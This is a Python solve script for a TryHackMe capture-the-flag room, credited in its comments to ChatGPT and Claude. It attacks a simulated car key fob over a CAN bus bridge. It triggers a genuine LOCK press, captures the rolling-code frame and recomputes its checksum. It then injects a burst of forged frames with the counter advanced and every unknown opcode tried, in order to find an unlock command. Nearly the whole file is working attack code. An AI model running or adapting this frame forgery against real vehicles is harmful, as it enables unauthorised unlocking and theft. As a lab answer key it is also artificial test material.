# script by Chatgpt and Claudi
# for tryhackme room Phantom Fob https://tryhackme.com/room/phantomfob
# YouTube video walk through: https://youtu.be/ccrxwt6zgbU


#!/usr/bin/env python3

import http.client
import json
import re
import socket
import time

HOST = "10.128.157.221"

SOCKETCAND_PORT = 29536
WEB_PORT = 8080

CHALLENGE_ID = "1A9"
FOB_ID = "57C"

OPCODE_INDEX = 7
COUNTER_INDEX = 2
CHECKSUM_INDEX = 4

#KNOWN_OPCODES = {
#    0x6C,  # LOCK
#    0x48,  # HORN
#    0x0B,  # IMMOB_ARM
#    0x7A,  # IMMOB_DISARM
#}

KNOWN_OPCODES={0xA2,0x2B,0x1E,0x4A}

FRAME_RE = re.compile(
    rb"<\s*frame\s+([0-9A-Fa-f]+)\s+"
    rb"[0-9.]+\s+([0-9A-Fa-f]+)\s*>"
)


def xor_bytes(data):
    value = 0

    for byte in data:
        value ^= byte

    return value


sock = socket.create_connection(
    (HOST, SOCKETCAND_PORT),
    timeout=10,
)

sock.settimeout(3)

# Receive socketcand greeting.
print(sock.recv(256).decode(errors="replace"))

sock.sendall(b"< open can0 >\n")
time.sleep(0.2)

sock.sendall(b"< rawmode >\n")
time.sleep(0.2)

buffer = b""
pressed = False
injected = False
started = time.time()

while time.time() - started < 15 and not injected:
    buffer += sock.recv(8192)
    consumed = 0

    for match in FRAME_RE.finditer(buffer):
        can_id = match.group(1).decode().upper()
        payload = bytes.fromhex(match.group(2).decode())
        consumed = match.end()

        # Immediately request a legitimate LOCK when a fresh
        # rolling challenge is observed.
        if can_id == CHALLENGE_ID and not pressed:
            connection = http.client.HTTPConnection(
                HOST,
                WEB_PORT,
                timeout=3,
            )

            body = json.dumps({"button": "LOCK"})

            connection.request(
                "POST",
                "/press",
                body,
                {"Content-Type": "application/json"},
            )

            response = connection.getresponse()
            response.read()
            connection.close()

            pressed = True
            continue

        # This should be the legitimate LOCK frame generated
        # under the newly observed challenge.
        if can_id == FOB_ID and pressed and len(payload) == 8:
            current_counter = payload[COUNTER_INDEX]
            next_counter = (current_counter + 1) & 0xFF

            target_xor = xor_bytes(payload)

            # derive the checksum offset live from the harvested frame
            #K = (payload[CHECKSUM_INDEX]
            #    - sum(payload[i] for i in range(8) if i != CHECKSUM_INDEX)) & 0xFF
            # derive the checksum offset live from the harvested frame
            K = (payload[CHECKSUM_INDEX]
                - sum(payload[i] for i in range(8) if i != CHECKSUM_INDEX)) & 0xFF

            print(f"Captured:     {payload.hex().upper()}")
            print(f"Current ctr:  {current_counter:02X}")
            print(f"Next ctr:     {next_counter:02X}")
            print(f"Target XOR:   {target_xor:02X}")
            print(f"Tokens:       {payload[5]:02X} {payload[7]:02X}")

            commands = []

            for opcode in range(256):
                if opcode in KNOWN_OPCODES:
                    continue

                # Retain the challenge tokens and all fixed bytes.
                candidate = bytearray(payload)

                candidate[OPCODE_INDEX] = opcode
                candidate[COUNTER_INDEX] = next_counter

                # Recalculate the checksum byte.
                candidate[CHECKSUM_INDEX] = 0
                candidate[CHECKSUM_INDEX] = (
                    sum(candidate[i] for i in range(8) if i != CHECKSUM_INDEX) + K
                ) & 0xFF

                data = " ".join(f"{byte:02X}" for byte in candidate)

                command = f"< send {FOB_ID} 8 {data} >\n"
                commands.append(command)

            sock.sendall("".join(commands).encode("ascii"))
            print(f"Sent {len(commands)} opcode candidates")
            injected = True
            break


    if consumed:
        buffer = buffer[consumed:]

    if len(buffer) > 16384:
        buffer = buffer[-4096:]

time.sleep(1)
sock.close()

if not injected:
    raise SystemExit("Failed to capture a fresh fob command")

print("Unlock candidate burst sent")

